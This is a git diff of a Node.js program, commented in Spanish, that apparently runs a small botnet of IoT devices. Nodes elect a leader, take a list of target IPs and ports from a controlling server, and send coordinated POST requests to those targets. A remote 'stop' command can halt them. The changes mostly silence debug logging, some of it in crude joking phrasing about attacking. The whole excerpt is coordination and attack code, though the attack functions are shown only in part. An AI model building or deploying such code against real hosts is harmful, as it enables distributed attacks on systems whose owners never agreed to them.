@@ -69,7 +69,7 @@ app.get('/', function(req, res){
 
 
 var pid = Math.floor((Math.random() * 100) - 1);
-console.log("ID:" + pid);
+//console.log("ID:" + pid);
 //Post para enviar una vez al servidor la ip y puerto del arduino
 setTimeout(function postIP(){
     //console.log("POSTING IPS");
@@ -91,7 +91,6 @@ var controlLoop = setInterval(function(){
     },3000);  
         if(leader && posts == length)
         {
-            console.log("I am the leader  and you shall Start Attacking my beatutiful babies");
             startAttack();
             leaderC ++;
         }
@@ -124,25 +123,27 @@ function postIOT(){
                 //console.log(body);
             if(body != "ok")
             {   
-                //if(body == "stop")
-                //{
-                //    attack = false;
-                //    posts = 1;
-                //    leader = true;
-                //}
-                //else
-                //{
+                if(body == "stop")
+                {
+                    console.log("Stopping the attack");
+                    attack = false;
+                    posts = 0;
+                    leader = true;
+                    leaderC = 0;
+                }
+                else
+                {
                     setTimeout(function(){
-                    console.log("ARDUINOS");
+                    //console.log("ARDUINOS");
                     arduinos = body.arduinos;
-                    console.log(arduinos);
-                    console.log("TARGETS");
+                    //console.log(arduinos);
+                    //console.log("TARGETS");
                     attackInfo = body.targets;
-                    console.log(attackInfo);
+                    //console.log(attackInfo);
                     length = arduinos.length;
                     setLeader();
                     }, 1000);
-                //}
+                }
             }
             })); 
 };
@@ -150,7 +151,7 @@ function postIOT(){
 //Post para esoger el lider
 app.post("/leader", function(req, res){
     //console.log("ID" + req.body);
-    console.log(req.body.id);
+    //console.log(req.body.id);
     if(pid <= req.body.id)
     {
         //el pid recibido es mayor q el mio, no soy leader
@@ -235,13 +236,13 @@ function checkLeader(){
 
 //Attackpost para atacar a la ip designada
 function startAttack(){
-    console.log("Start Attacking Small Children");
+    //console.log("Start Attacking Small Children");
             var attackjs = {};
             attackjs.position = 0;//Math.floor((Math.random() * length) - 1);
             attackjs.leader = info;
 
-            console.log("Start Attack");
-            console.log(attackjs);
+            //console.log("Start Attack");
+            //console.log(attackjs);
             for(i = 0 ; i < length; i++)
             {
                 (request({
@@ -257,10 +258,10 @@ function startAttack(){
 
 //Attackpost para atacar a la ip designada
 function attackPost(){
-        console.log("Attacking");
+        //console.log("Attacking");
         //console.log(attackInfo.ips[0])
         //console.log(attackInfo.ports[0])
-        console.log(info);
+        //console.log(info);
         (request({
         url: "http://" + attackInfo.ips[attacking] + ":" + attackInfo.ports[attacking] + "/",
         method: "POST",
